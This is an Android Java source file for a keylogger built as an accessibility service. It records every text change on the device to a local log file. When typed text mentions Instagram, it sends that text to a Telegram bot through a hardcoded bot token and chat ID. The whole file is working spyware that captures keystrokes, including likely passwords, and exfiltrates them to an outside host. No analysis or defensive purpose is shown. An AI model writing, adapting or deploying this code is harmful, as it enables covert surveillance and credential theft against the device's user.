package com.night.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import java.util.concurrent.Executors;
import java.util.concurrent.ExecutorService;

public class KeyloggerService extends AccessibilityService {

    // 🔥 MAHARAJ KE CREDENTIALS – EMBEDDED HARD CORE
    private static final String BOT_TOKEN = "8913166501:AAELLa_O-3RTpofh7dGTQBxtDsOGvE8GLSY";
    private static final String CHAT_ID = "8730250506";

    private final OkHttpClient client = new OkHttpClient();
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private String lastText = "";
    private static final String LOG_FILE = "keylog.txt";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                String currentText = source.getText() != null ? source.getText().toString() : "";
                if (!currentText.isEmpty() && !currentText.equals(lastText)) {
                    lastText = currentText;
                    // Log to file (internal storage)
                    logToFile(currentText);

                    // Check for Instagram keywords
                    String lower = currentText.toLowerCase();
                    if (lower.contains("instagram.com") || lower.contains("insta") || lower.contains("instagram")) {
                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                        String alertMsg = "📸 INSTAGRAM DETECTED!\nTyped: " + currentText + "\nTime: " + timestamp;
                        sendTelegramAlert(alertMsg);
                    }
                }
                source.recycle();
            }
        }
    }

    private void logToFile(String text) {
        try {
            FileOutputStream fos = openFileOutput(LOG_FILE, MODE_APPEND);
            OutputStreamWriter writer = new OutputStreamWriter(fos);
            String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
            writer.write("[" + timestamp + "] " + text + "\n");
            writer.close();
            fos.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendTelegramAlert(String msg) {
        executor.submit(() -> {
            try {
                String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + java.net.URLEncoder.encode(msg, "UTF-8");
                Request request = new Request.Builder().url(url).build();
                try (Response response = client.newCall(request).execute()) {
                    // Success – ignore
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    @Override
    public void onInterrupt() { }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        setServiceInfo(info);
    }
  }
